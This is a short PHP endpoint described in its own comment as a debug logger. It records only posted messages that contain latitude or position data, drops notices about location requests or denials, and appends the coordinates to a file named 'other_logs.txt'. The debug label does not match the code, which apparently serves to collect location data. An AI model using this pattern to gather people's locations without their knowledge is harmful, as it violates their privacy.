<?php
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

// Simple debug logging script
if (isset($_POST['message'])) {
    $message = trim((string) $_POST['message']);
    $message = preg_replace('/[\x00-\x1F\x7F]/', '', $message) ?? '';
    $message = substr($message, 0, 512);
    $date    = date('Y-m-d H:i:s');

    if ($message === '') {
        http_response_code(422);
        echo json_encode(['status' => 'error', 'message' => 'Empty message']);
        exit;
    }

    // Filter out messages we do not want to log
    $filtered_messages = [
        "Location data sent",
        "getLocation called",
        "Geolocation error",
        "Location permission denied"
    ];
    $should_filter = false;
    foreach ($filtered_messages as $filtered_phrase) {
        if (strpos($message, $filtered_phrase) !== false) {
            $should_filter = true;
            break;
        }
    }
    // Only log essential location data (coordinates)
    if (!$should_filter && (
        strpos($message, 'Lat:')              !== false ||
        strpos($message, 'Latitude:')         !== false ||
        strpos($message, 'Position obtained') !== false
    )) {
        /* ── Central data directory ── */
        $data_dir = dirname(__DIR__) . '/data';
        if (!is_dir($data_dir)) {
            mkdir($data_dir, 0750, true);
        }
        $log_file = $data_dir . '/other_logs.txt';
        $fp = fopen($log_file, 'a');
        if ($fp) {
            flock($fp, LOCK_EX);
            fwrite($fp, "[{$date}] {$message}\n");
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }
    echo json_encode(['status' => 'success']);
    exit;
} else {
    http_response_code(422);
    echo json_encode(['status' => 'error', 'message' => 'No message provided']);
    exit;
}
